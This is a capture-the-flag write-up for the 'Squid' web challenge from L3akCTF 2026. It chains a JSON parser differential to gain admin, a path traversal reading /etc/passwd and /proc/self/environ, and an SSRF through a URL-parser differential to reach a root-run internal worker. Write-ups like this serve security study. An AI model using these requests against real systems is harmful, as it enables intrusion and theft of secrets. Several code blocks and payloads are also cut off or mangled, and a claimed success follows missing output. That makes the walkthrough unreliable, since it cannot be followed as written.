    <h1>L3akCTF 2026 - Squid</h1>
    <div class="info">
      <div>
        <div class="tags">
          
          <span class="tag tag-green">Web</span>
          
          <span class="tag tag-blue">SSRF</span>

  <p>Squid was a Server-Side Web challenge with just 3 solves in the end (not counting the several removed LLM-assisted solves 😄). One rule that made <a href="https://ctftime.org/event/3061/" target="_blank">L3akCTF 2026</a> stand out was its zero-tolerance LLM policy, which made challenges much more rewarding to solve.</p>
<p>The start of this challenge was relatively simple, but we'll jump to internal hosts and learn a generic technique that allows reading files with 0 size like <code>/proc/.../environ</code> in the <code>send_file()</code> function from Flask (and likely more, so be prepared in your next CTF 😉).</p>
<p>Let's get into the challenge!</p>
<h2 id="mass-assignment">Mass Assignment</h2>
<p>We get a <code>public_app.py</code> that, as the name suggests, is publicly available on <a href="http://localhost:13337" target="_blank">http://localhost:13337</a> after starting the Docker stack with <code>docker compose up --build</code>. At <code>/register</code>, we can register with any credentials, but our default role is &quot;user&quot;.</p>
<p>With the &quot;user&quot; role, we cannot access <code>is_staff()</code>-protected endpoints, which are basically all the interesting ones.</p>

<p>So the first step is likely to become &quot;admin&quot;. There are no predefined <code>USERS</code> we could attack, but there is some weird logic in the <code>/api/register</code> endpoint:</p>
<pre><code data-lang="Python"><span class="hl-source hl-python"><span class="hl-meta hl-annotation hl-python"><span class="hl-punctuation hl-definition hl-annotation hl-python">@</span><span class="hl-meta hl-annotation hl-function hl-python"></span></span><span class="hl-meta hl-annotation hl-function hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">app</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-annotation hl-function hl-python"><span class="hl-meta hl-generic-name hl-python">post</span></span></span></span><span class="hl-meta hl-annotation hl-function hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span></span><span class="hl-meta hl-annotation hl-arguments hl-python"><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-double hl-python"><span class="hl-punctuation hl-definition hl-string hl-begin hl-python">&quot;</span></span></span><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-double hl-python">/api/register<span class="hl-punctuation hl-definition hl-string hl-end hl-python">&quot;</span></span></span></span><span class="hl-meta hl-annotation hl-function hl-python"><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>
<span class="hl-meta hl-function hl-python"><span class="hl-storage hl-type hl-function hl-python"><span class="hl-keyword hl-declaration hl-function hl-python">def</span></span> <span class="hl-entity hl-name hl-function hl-python"><span class="hl-meta hl-generic-name hl-python">api_register</span></span></span><span class="hl-meta hl-function hl-parameters hl-python"><span class="hl-punctuation hl-section hl-parameters hl-begin hl-python">(</span></span><span class="hl-meta hl-function hl-parameters hl-python"><span class="hl-punctuation hl-section hl-parameters hl-end hl-python">)</span></span><span class="hl-meta hl-function hl-python"><span class="hl-punctuation hl-section hl-function hl-begin hl-python">:</span></span>

<p>But the endpoint also tries to read a <code>role</code> key, defaulting to &quot;user&quot;. If we only change:</p>
<pre><code data-lang="JSON"><span class="hl-source hl-json"><span class="hl-meta hl-mapping hl-json"><span class="hl-punctuation hl-section hl-mapping hl-begin hl-json">{</span></span><span class="hl-meta hl-mapping hl-key hl-json"><span class="hl-string hl-quoted hl-double hl-json"><span class="hl-punctuation hl-definition hl-string hl-begin hl-json">&quot;</span>username<span class="hl-punctuation hl-definition hl-string hl-end hl-json">&quot;</span></span></span><span class="hl-meta hl-mapping hl-json"><span class="hl-punctuation hl-separator hl-mapping hl-key-value hl-json">:</span> </span><span class="hl-meta hl-mapping hl-value hl-json"><span class="hl-string hl-quoted hl-double hl-json"><span class="hl-punctuation hl-definition hl-string hl-begin hl-json">&quot;</span>j0r1an<span class="hl-punctuation hl-definition hl-string hl-end hl-json">&quot;</span></span><span class="hl-punctuation hl-separator hl-mapping hl-pair hl-json">,</span> </span><span class="hl-meta hl-mapping hl-key hl-json"><span class="hl-string hl-quoted hl-double hl-json"><span class="hl-punctuation hl-definition hl-string hl-begin hl-json">&quot;</span>password<span class="hl-punctuation hl-definition hl-string hl-end hl-json">&quot;</span></span></span><span class="hl-meta hl-mapping hl-value hl-json"><span class="hl-punctuation hl-separator hl-mapping hl-key-value hl-json">:</span> </span><span class="hl-meta hl-mapping hl-value hl-json"><span class="hl-string hl-quoted hl-double hl-json"><span class="hl-punctuation hl-definition hl-string hl-begin hl-json">&quot;</span>j0r1an<span class="hl-punctuation hl-definition hl-string hl-end hl-json">&quot;</span></span><span class="hl-punctuation hl-section hl-mapping hl-end hl-json">}</span></span>
</span></code></pre>
<p>To:</p>
<pre><code data-lang="JSON"><span class="hl-source hl-json"><span class="hl-meta hl-mapping hl-json"><span class="hl-punctuation hl-section hl-mapping hl-begin hl-json">{</span></span><span hl-json">&quot;</span>j0r1an<span class="hl-punctuation hl-definition hl-string hl-end hl-json">&quot;</span></span><span class="hl-punctuation hl-separator hl-mapping hl-pair hl-json">,</span> </span><span class="hl-meta hl-mapping hl-key hl-json"><span class="hl-string hl-quoted hl-double hl-json"><span class="hl-punctuation hl-definition hl-string hl-begin class="hl-punctuation hl-separator hl-mapping hl-key-value hl-json">:</span> </span><span class="hl-meta hl-mapping hl-value hl-json"><span class="hl-string hl-quoted hl-double hl-json"><span class="hl-punctuation hl-definition hl-string hl-begin hl-json">&quot;</span>j0r1an<span class="hl-punctuation hl-definition hl-string hl-end hl-json">&quot;</span></span><span class="hl-punctuation hl-separator hl-mapping hl-pair hl-json">,</span> </span><span class="hl-meta hl-mapping hl-key hl-json"><span class="hl-string hl-quoted hl-double hl-json"><span class="hl-punctuation hl-definition class="hl-punctuation hl-definition hl-string hl-begin hl-json">&quot;</span>admin<span class="hl-punctuation hl-definition hl-string hl-end hl-json">&quot;</span></span><span class="hl-punctuation </span></code></pre>
<p>We hit another check:</p>
<blockquote>
<p>self-service accounts cannot request the admin role</p>
</blockquote>
<p><code>json.loads()</code> parses our request body and denies it when the <code>role</code> key is &quot;admin&quot;. However, the code later switches to <code>ujson.loads()</code> to read the record and actually <em>save</em> the role.</p>
<h3 id="json-vs-ujson-parser-differential">json vs. ujson Parser Differential</h3>
<p>The two JSON parsers <a href="https://docs.python.org/3/library/json.html" target="_blank">json</a> and <a href="https://pypi.org/project/ujson/" target="_blank">ujson</a> may parse the input slightly differently. Because the check is separated from the use, all we need is to obfuscate the <code>role</code> key somehow for <code>json</code>, while <code>ujson</code> still reads it correctly.</p>
<p>Luckily, there is some prior research on this. In an article by Jake Miller at BishopFox (<a href="https://bishopfox.com/blog/json-interoperability-vulnerabilities" target="_blank">&quot;An Exploration of JSON Interoperability Vulnerabilities&quot;</a>), they describe various common JSON parser ambiguities. We can just go through them one by one and see if any work:</p>
<pre><code data-lang="Python"><span class="hl-source hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">uv</span></span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">run</span></span> <span class="hl-keyword hl-operator hl-arithmetic hl-python">-</span><span class="hl-keyword hl-operator hl-arithmetic hl-python">-</span><span class="hl-meta hl-statement hl-with hl-python"><span class="hl-keyword hl-control hl-flow hl-with hl-python">with</span> <span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-single hl-python"><span class="hl-punctuation hl-definition hl-string hl-begin hl-python">&#39;</span></span></span><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-single hl-python">ujson==5.0.0<span class="hl-punctuation hl-definition hl-string hl-end hl-python">&#39;</span></span></span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">python</span></span></span>
<span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span> <span class="hl-meta hl-statement hl-import hl-python"><span class="hl-keyword hl-control hl-import hl-python">import</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">json</span></span></span>
<span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span> <span class="hl-meta hl-statement hl-import hl-python"><span class="hl-keyword hl-control hl-import hl-python">import</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">ujson</span></span></span>

<span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span> <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">json</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-meta hl-generic-name hl-python">loads</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-single hl-python"><span class="hl-punctuation hl-definition hl-string hl-begin hl-python">&#39;</span></span></span><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-single hl-python">{&quot;role&quot;:&quot;user&quot;,&quot;role&quot;:&quot;admin&quot;}<span class="hl-punctuation hl-definition hl-string hl-end hl-python">&#39;</span></span></span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>

</span></code></pre>
<p>Success! Duplicate keys resolve to the last for both libraries, <code>\x0d</code> isn't recognizes as a valid escape code by both, but a difference lies in handling dangling surrogates (<code>\ud800</code>). <code>json</code> sees the extra character and makes a new key for it, while <code>ujson</code> ignores it and overwrites the previous key, making the resulting role &quot;admin&quot;.</p>
<blockquote>
<p><strong>Note</strong>: This differential only works on ujson &lt; 5.4.0, it ended up being treated as a real security vulnerability (<a href="https://github.com/advisories/GHSA-wpqr-jcpx-745r" target="_blank">GHSA-wpqr-jcpx-745r</a>)</p>
</blockquote>
<p>This allows us to register as a real admin and access the other functionality in this app:</p>
<pre><code data-lang="HTTP"><span class="hl-text hl-http-request-response"><span class="hl-meta hl-http-verb hl-http-request-response"><span class="hl-keyword hl-operator hl-word hl-http-request-response">POST</span></span> <span class="hl-meta hl-url"><span class="hl-punctuation hl-separator hl-path hl-directory hl-http-request-response">/</span></span><span class="hl-meta hl-url hl-http-request-response">api</span><span class="hl-meta hl-url"><span class="hl-punctuation hl-separator hl-path hl-directory hl-http-request-response">/</span></span><span class="hl-meta hl-url hl-http-request-response">register</span> <span class="hl-constant hl-language hl-protocol-version hl-http-request-response">HTTP/1.1</span><span class="hl-meta hl-headers hl-http-request-response">
<span class="hl-string hl-unquoted hl-http-header hl-value hl-http-request-response"><span class="hl-keyword hl-other hl-http-header hl-key hl-http-request-response">Host</span><span class="hl-punctuation hl-separator hl-key-value hl-http-request-response">:</span> localhost:13337</span>
<span class="hl-keyword hl-other hl-http-header hl-key hl-http-request-response">Content-Length</span><span class="hl-punctuation hl-separator hl-key-value hl-http-request-response">:</span> <span class="hl-meta hl-number hl-integer hl-decimal hl-http-request-response"><span class="hl-constant hl-numeric hl-value hl-http-request-response">64</span></span>

<h2 id="file-read">File Read</h2>
<p>Passing <code>is_staff()</code> checks now, this unlocks the <code>/download/:target</code> endpoint. It joins our path variable with a static directory and sends back the content of the file at this location:</p>
<pre><code data-lang="Python"><span class="hl-source hl-python"><span class="hl-meta hl-annotation hl-python"><span class="hl-punctuation hl-definition hl-annotation hl-python">@</span><span class="hl-meta hl-annotation hl-function hl-python"></span></span><span class="hl-meta hl-annotation hl-function hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">app</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-annotation hl-function hl-python"><span class="hl-meta hl-generic-name hl-python">get</span></span></span></span><span class="hl-meta hl-annotation hl-function hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span></span><span class="hl-meta hl-annotation hl-arguments hl-python"><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-double hl-python"><span class="hl-punctuation hl-definition hl-string hl-begin hl-python">&quot;</span></span></span><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-double hl-python">/download/&lt;path:target&gt;<span class="hl-punctuation hl-definition hl-string hl-end hl-python">&quot;</span></span></span></span><span class="hl-meta hl-annotation hl-function hl-python"><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>

</span></code></pre>
<p>There is an obvious path traversal vulnerability here. By prefixing our <code>target</code> path with <code>../</code> sequences, we can read any file on the filesystem. If we try to request <a href="http://localhost:13337/download/..%2F..%2F..%2F..%2Fetc%2Fpasswd" target="_blank">http://localhost:13337/download/..%2F..%2F..%2F..%2Fetc%2Fpasswd</a>, however, we get an unexpected response from Nginx:</p>
<blockquote>
<p>400 Bad Request</p>
</blockquote>
<p>Nginx has a sanity check during its internal URL normalization step to count the depth of the requested path vs. the number of <code>../</code> sequences. If you path-traverse more than there are existing path segments before it, you receive a &quot;400 Bad Request&quot; error instead. Because we only have one segment (<code>/download/</code>), we can only path-traverse once outside of the <code>WORK</code> directory. But we're lucky that it is set to only <code>/work</code>, no deeper path. So one traversal is enough to access the whole filesystem!</p>
<p><a href="http://localhost:13337/download/..%2Fetc%2Fpasswd" target="_blank">http://localhost:13337/download/..%2Fetc%2Fpasswd</a></p>
<pre><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
</code></pre>
<p>This is a nice primitive! But for now we can't do much with it as it's running as the <code>ctf</code> user while the flag is stored in <code>/secrets/flag</code> owned and readable only by the <code>root</code> user.</p>
<p>Trying to read <code>/proc/self/environ</code> for environment variables also fails:</p>
<pre><code data-lang="Bash"><span class="hl-source hl-shell hl-bash"><span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">$</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> curl<span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>i</span><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>H</span> <span class="hl-string hl-quoted hl-single hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&#39;</span>Cookie: session=ey...8k<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&#39;</span></span> http://localhost:13337/download/..<span class="hl-meta hl-group hl-expansion hl-job hl-shell"><span class="hl-punctuation hl-definition hl-variable hl-job hl-shell">%</span><span class="hl-constant hl-numeric hl-integer hl-decimal hl-job hl-shell">2</span></span>Fproc<span class="hl-meta hl-group hl-expansion hl-job hl-shell"><span class="hl-punctuation hl-definition hl-variable hl-job hl-shell">%</span><span class="hl-constant hl-numeric hl-integer hl-decimal hl-job hl-shell">2</span></span>Fself<span class="hl-meta hl-group hl-expansion hl-job hl-shell"><span class="hl-punctuation hl-definition hl-variable hl-job hl-shell">%</span><span class="hl-constant hl-numeric hl-integer hl-decimal hl-job hl-shell">2</span></span>Fenviron</span>
<span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">HTTP/1.1</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> 200 OK</span>
<span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">Content-Type:</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> application/octet-stream</span>
<span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">Content-Length:</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> 0</span>
<span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">Content-Disposition:</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> inline</span><span class="hl-keyword hl-operator hl-logical hl-continue hl-shell">;</span> <span class="hl-variable hl-other hl-readwrite hl-assignment hl-shell">filename</span><span class="hl-keyword hl-operator hl-assignment hl-shell">=</span><span class="hl-string hl-unquoted hl-shell">environ</span>
</span></code></pre>
<p>It successfully finds the file indicated by the <code>200 OK</code>, but due to the size of the file being reported as <code>0</code> by the OS, 0 bytes are sent to us. We'll get back to this in the <a href="#flask-send_file-size-race-condition">Flask send_file() size Race Condition</a> section.</p>
<h2 id="ssrf-via-urllib-vs-requests">SSRF via urllib vs. requests</h2>

<p>This gets <code>url</code> from our request body and parses it with <code>urllib.parse.urlparse()</code> to check if the hostname is allowed, before requesting and returning the content at this URL. From the allowed <code>TRUSTED_MIRRORS</code>, none resolve. To get anything from this function we <em>need</em> to get it to request a different hostname that isn't allowed. Time for another parser differential!</p>
<p>Let's see if <code>requests</code> even uses a different parser than <code>urllib</code>. If it also just imports that, we're in bad luck. Just tracing where the <code>url</code> parameter flows into through the library, we end up <a href="https://github.com/psf/requests/blob/414f0513c33883adf6f2b46901d4f0b38a455851/src/requests/models.py#L511" target="_blank">here in <code>models.py</code></a>:</p>
<pre><code data-lang="Python"><span class="hl-source hl-python"><span class="hl-meta hl-statement hl-import hl-python"><span class="hl-keyword hl-control hl-import hl-from hl-python">from</span></span><span class="hl-meta hl-statement hl-import hl-python"><span class="hl-meta hl-import-source hl-python"> <span class="hl-meta hl-import-path hl-python"><span class="hl-meta hl-import-name hl-python">urllib3</span><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span><span class="hl-meta hl-import-name hl-python">util</span></span> <span class="hl-meta hl-statement hl-import hl-python"><span class="hl-keyword hl-control hl-import hl-python">import</span></span></span></span><span class="hl-meta hl-statement hl-import hl-python"></span><span class="hl-meta hl-statement hl-import hl-python"> <span class="hl-meta hl-generic-name hl-python">parse_url</span></span>
<span class="hl-constant hl-language hl-python">...</span>

<p><code>urllib3</code> is used. We previously saw <a href="https://docs.python.org/3/library/urllib.html" target="_blank">urllib</a> which is in the Python standard library, but <code>requests</code> internally uses <a href="https://pypi.org/project/urllib3/" target="_blank">urllib3</a> which is a re-implementation of it with different features, and importantly, a <em>new parser</em>.</p>
<p>Prior research by Thomas Chauchefoin at SonarSource (<a href="https://www.sonarsource.com/blog/security-implications-of-url-parsing-differentials/" target="_blank">&quot;Security Implications of URL Parsing Differentials&quot;</a>) shows an example of these two parsers already.</p>
<p>They highlight one specific vector that causes a lot of confusion between parsers: <code>http://a.tld\@b.tld</code></p>
<pre><code data-lang="Python"><span class="hl-source hl-python"><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span> <span class="hl-meta hl-statement hl-import hl-python"><span class="hl-keyword hl-control hl-import hl-python">import</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">urllib</span><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span><span class="hl-meta hl-generic-name hl-python">parse</span></span></span>

<p>It works perfectly for our case! If we set a URL like <code>https://example.com\@manifests.buildfarm.internal</code>, the 1st parser sees <code>manifests.buildfarm.internal</code>, which is allowed through. Then, the 2nd parser sees <code>https://example.com</code> with just a bit of a strange path.</p>
<p>As for what to reach with this, there is a second server on port 8000 only listening on <code>localhost</code>. We can now reach it:</p>

<p>It handles any path and is configured by a GET query parameter <code>?spec=</code>. This doesn't change our parser differential, so we can just append it. We can schedule a job through this internal server as follows:</p>
<pre><code data-lang="HTTP"><span class="hl-text hl-http-request-response"><span class="hl-meta hl-http-verb hl-http-request-response"><span class="hl-keyword hl-operator hl-word hl-http-request-response">POST</span></span> <span class="hl-meta hl-url"><span class="hl-punctuation hl-separator hl-path hl-directory hl-http-request-response">/</span></span><span class="hl-meta hl-url hl-http-request-response">api</span><span class="hl-meta hl-url"><span class="hl-punctuation hl-separator hl-path hl-directory hl-http-request-response">/</span></span><span class="hl-meta hl-url hl-http-request-response">manifest</span> <span class="hl-constant hl-language hl-protocol-version hl-http-request-response">HTTP/1.1</span><span class="hl-meta hl-headers hl-http-request-response">
<span class="hl-string hl-unquoted hl-http-header hl-value hl-http-request-response"><span class="hl-keyword hl-other hl-http-header hl-key hl-http-request-response">Host</span><span class="hl-punctuation hl-separator hl-key-value hl-http-request-response">:</span> localhost:13337</span>
<span class="hl-keyword hl-other hl-http-header hl-key hl-http-request-response">Content-Length</span><span class="hl-punctuation hl-separator hl-key-value hl-http-request-response">:</span> <span class="hl-meta hl-number hl-integer hl-decimal hl-http-request-response"><span class="hl-constant hl-numeric hl-value hl-http-request-response">108</span></span>
<span class="hl-keyword hl-other hl-http-header hl-key hl-http-request-response">Content-Type</span><span class="hl-punctuation hl-separator hl-key-value hl-http-request-response">:</span> </span><span class="hl-meta hl-headers hl-http-request-response"><span class="hl-string hl-unquoted hl-http-header hl-value hl-http-request-response">application/json</span></span><span class="hl-meta hl-headers hl-http-request-response">
<span class="hl-string hl-unquoted hl-http-header hl-value hl-http-request-response"><span class="hl-keyword hl-other hl-http-header hl-key hl-http-request-response">Cookie</span><span class="hl-punctuation hl-separator hl-key-value hl-http-request-response">:</span> <span class="hl-variable hl-parameter hl-http-request-response">session</span><span class="hl-keyword hl-operator hl-assignment hl-http-request-response">=</span>ey...8k</span>

</span><span class="hl-meta hl-body hl-http-request-response"><span class="hl-source hl-json"><span class="hl-meta hl-mapping hl-json"><span class="hl-punctuation hl-section hl-mapping hl-begin hl-json">{</span></span><span class="hl-meta hl-mapping hl-key hl-json"><span class="hl-string hl-quoted hl-double hl-json"><span class="hl-punctuation hl-definition hl-string hl-begin hl-json">&quot;</span>url<span class="hl-punctuation hl-definition hl-string hl-end hl-json">&quot;</span></span></span><span class="hl-meta hl-mapping hl-json"><span class="hl-punctuation hl-separator hl-mapping hl-key-value hl-json">:</span></span><span class="hl-meta hl-mapping hl-value hl-json"><span class="hl-string hl-quoted hl-double hl-json"><span class="hl-punctuation hl-definition hl-string hl-begin hl-json">&quot;</span>http://localhost:8000<span class="hl-constant hl-character hl-escape hl-json">\\</span>@manifests.buildfarm.internal?spec={}}<span class="hl-punctuation hl-definition hl-string hl-end hl-json">&quot;</span></span><span class="hl-punctuation hl-section hl-mapping hl-end hl-json">}</span></span>
</span></span></span></code></pre>
<h2 id="interacting-with-worker-py">Interacting with worker.py</h2>
<p>Now the question is what can we do with this new server. Well, the nice part is that as opposed to the <code>public_app.py</code> this server is <strong>running as root</strong>. See below the <code>entrypoint.sh</code> where <code>/app/worker.py</code> (localhost:8000) is run directly in a background process (stays root), and the public app is wrapped with <code>gosu ctf</code>, setting the user to <code>ctf</code>:</p>
<pre><code data-lang="Bash"><span class="hl-source hl-shell hl-bash"><span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">...</span></span>
<span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">python</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> /app/worker.py</span> <span class="hl-keyword hl-operator hl-logical hl-job hl-shell">&amp;</span>

<span class="hl-meta hl-function-call hl-shell"><span class="hl-support hl-function hl-exec hl-shell">exec</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> gosu ctf gunicorn ... public_app:app</span>
</span></code></pre>
<p>That means it can access the flag and does so here:</p>
<pre><code data-lang="Python"><span class="hl-source hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-other hl-constant hl-python">VAULT_FILE</span></span> <span class="hl-keyword hl-operator hl-assignment hl-python">=</span> <span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-double hl-python"><span class="hl-punctuation hl-definition hl-string hl-begin hl-python">&quot;</span></span></span><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-double hl-python">/secrets/flag<span class="hl-punctuation hl-definition hl-string hl-end hl-python">&quot;</span></span></span>

<p>This function filters environment variables and, while doing so, uses <a href="https://docs.python.org/3.9/library/string.html?highlight=string#template-strings" target="_blank"><code>string.Template</code></a> to allow values to reference the vault variables (<code>FLAG</code>). The syntax for this library is pretty basic, just <code>$FLAG</code> or <code>${FLAG}</code>, no format specifiers or anything.</p>
<p>Where is <code>materialise_env()</code> used, you may ask? It is in the handler that we can call now via the SSRF:</p>

<p>It spawns a subprocess <code>runner.py</code> with arguments <code>build /work/RANDOM_HEX 60.0</code>. In the <code>spec</code> parameter we provide, <strong>environment variables</strong> to the process, which are restricted and templated via the function from before. Now environment variables are pretty powerful, so the restrictions better be sound.</p>
<p>The <code>runner.py</code> file itself isn't too interesting. It just prints some static strings to a <code>build.log</code> file and waits for the number of seconds we specify in <code>ttl</code>.</p>

    <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-support hl-function hl-builtin hl-python">print</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">os</span><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span><span class="hl-meta hl-generic-name hl-python">environ</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-meta hl-generic-name hl-python">get</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-double hl-python"><span class="hl-punctuation hl-definition hl-string hl-begin hl-python">&quot;</span></span></span><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-double hl-python">test<span class="hl-punctuation hl-definition hl-string hl-end hl-python">&quot;</span></span></span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>
    <span class="hl-meta hl-statement hl-loop hl-while hl-python"><span class="hl-keyword hl-control hl-loop hl-while hl-python">while</span> <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">time</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-meta hl-generic-name hl-python">time</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span> <span class="hl-keyword hl-operator hl-comparison hl-python">&lt;</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">deadline</span></span><span class="hl-punctuation hl-section hl-block hl-loop hl-while hl-python">:</span></span>
        <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">time</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-meta hl-generic-name hl-python">sleep</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-constant hl-numeric hl-float hl-decimal hl-python">0<span class="hl-punctuation hl-separator hl-decimal hl-python">.</span>2</span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>
</span></code></pre>
<p>We can quickly test with <a href="https://man7.org/linux/man-pages/man1/ltrace.1.html" target="_blank"><code>ltrace</code></a> where <code>getenv()</code> calls are made to read specific environment variables, then evaluate what happens if we control them.</p>
<pre><code data-lang="Bash"><span class="hl-source hl-shell hl-bash"><span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">$</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> docker compose exec<span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>u</span> ctf<span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>it</span> app bash</span>
<span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">$</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> mkdir /work/test</span>
<span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">$</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> ltrace<span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>e</span> getenv /usr/local/bin/python<span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>I</span> /app/runner.py build /work/test 60.0</span>
